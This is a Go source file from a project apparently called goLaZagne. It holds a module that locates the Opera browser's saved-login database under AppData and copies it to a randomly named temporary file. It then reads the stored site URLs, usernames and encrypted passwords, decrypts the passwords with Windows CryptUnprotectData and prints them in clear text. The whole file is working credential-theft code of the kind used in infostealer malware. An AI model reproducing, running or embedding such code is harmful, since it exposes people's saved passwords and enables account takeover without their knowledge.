package browsers


import (
	"os"
	"fmt"
	"database/sql"
	"goLaZagne/common"
	"log"
)

var (
	operaPathsUserData = []string{
		common.AppData +"\\Opera Software\\Opera Stable",
	}
	temporaryDbName = common.RandStringRunes(10)
)

func OperaModuleStart(path string){
	if _, err := os.Stat(path); err == nil {
		dbPath := fmt.Sprintf("%s\\Login data", path)

		if _, err := os.Stat(dbPath); err == nil {
			err := common.CopyFile(dbPath, temporaryDbName)
			if err != nil{
				log.Panic(err.Error())
			}
		}

		db, err := sql.Open("sqlite3", temporaryDbName)
		if err != nil {
			log.Panic(err.Error())
		}
		rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
		var actionUrl, username, password string
		for rows.Next(){
			rows.Scan(&actionUrl, &username, &password)
			fmt.Printf("%s %s - %s", actionUrl, username, common.Win32CryptUnprotectData(password, false))
		}

	}
}

func OperaExtractDataRun(){
	for i:=range operaPathsUserData {
		if _, err := os.Stat(operaPathsUserData[i]); err == nil {
			OperaModuleStart(operaPathsUserData[i])
		}
	}
}